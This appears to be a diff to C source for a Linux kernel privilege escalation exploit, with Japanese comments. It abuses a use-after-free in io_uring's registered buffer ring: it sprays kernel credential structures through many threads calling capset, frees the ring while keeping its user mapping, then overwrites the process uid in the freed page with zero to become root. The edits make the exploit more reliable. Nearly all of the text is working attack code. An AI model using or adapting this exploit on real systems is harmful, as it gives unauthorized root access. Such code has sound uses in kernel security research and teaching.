@@ -13,19 +13,21 @@
 #include <sys/wait.h>
 #include <pthread.h>
 
-const int THREAD_NUM = 500;
+#define THREAD_NUM 1500
 
 struct state {
     // cred spray の準備が整ったか
     bool is_ready_for_spray;
     // 権限昇格に成功したスレッドがあるか
     bool exist_root;
+    // setcap() を実行したスレッド数
+    int setcap_num;
 };
-struct state state = { false, false };
+struct state state = { false, false, 0 };
 
 pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
 
-void errExit(char* msg1) {
+void errExit(const char *msg1) {
     puts(msg1);
     exit(-1);
 }
@@ -49,6 +51,9 @@ void *setcap_worker(void *param) {
     }
 
     if (syscall(SYS_capset, &cap_header, (void *)cap_data)) errExit("[-] capset() failed");
+    pthread_mutex_lock(&lock);
+    state.setcap_num++;
+    pthread_mutex_unlock(&lock);
 
     while (1) {
         pthread_mutex_lock(&lock);
@@ -73,27 +78,29 @@ void *setcap_worker(void *param) {
     return NULL;
 }
 
-void pinning_thread(int core) {
+void pinning_cpu(int core) {
   cpu_set_t mask;
 
   CPU_ZERO(&mask);
   CPU_SET(core, &mask);
 
-  if (pthread_setaffinity_np(pthread_self(), sizeof(mask), &mask) < 0) {
-    errExit("[-] pthread_setaffinity_np");
+  if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0) {
+    errExit("[-] pinning_thread failed");
   }
 }
 
 int main() {
-    pinning_thread(0);
+    int i; // for loop
+    pinning_cpu(0);
 
     pthread_t thread[THREAD_NUM];
-    int ret = 0;
-    puts("[+] create threads");
-    for (int i = 0; i < THREAD_NUM; i++) {
-        ret = pthread_create(&thread[i], NULL, setcap_worker, NULL);
+    puts("[+] creating threads...");
+    for (i = 0; i < THREAD_NUM; i++) {
+        int ret = pthread_create(&thread[i], NULL, setcap_worker, NULL);
         if (ret) errExit("[-] failed to create thread\n");
     }
+
+    sleep(1);
     
     // io_uring の初期化
     puts("[+] init io_uring");
@@ -116,22 +123,25 @@ int main() {
     puts("[+] map ring buffer to user space");
 
     // 他のプロセスに CPU を譲る
-    for (int _ = 0; _ < 10; _++) {
+    for (i = 0; i < 10; i++) {
         sched_yield();
     }
 
     // ring 解放
-    io_uring_unregister_buf_ring(&ring, reg.bgid);
     puts("[+] release ring buffer");
+    io_uring_unregister_buf_ring(&ring, reg.bgid);
     state.is_ready_for_spray = true;
 
     // cred spray を待つ
-    sleep(1);
+    puts("[+] waiting for cred spray...");
+    while (state.setcap_num < THREAD_NUM) {
+        usleep(1000);
+    }
     
     // Use-After-Free
     puts("[+] checking if uid is in place");
     uid_t user_id = getuid();
-    for (int i = 0; i < 0x1000 / sizeof(uint16_t); i++) {
+    for (i = 0; i < 0x1000 / sizeof(uint16_t); i++) {
         uint16_t *value = (uint16_t *)pbuf_map + i;
         if (*value == user_id) {
             *value = 0;
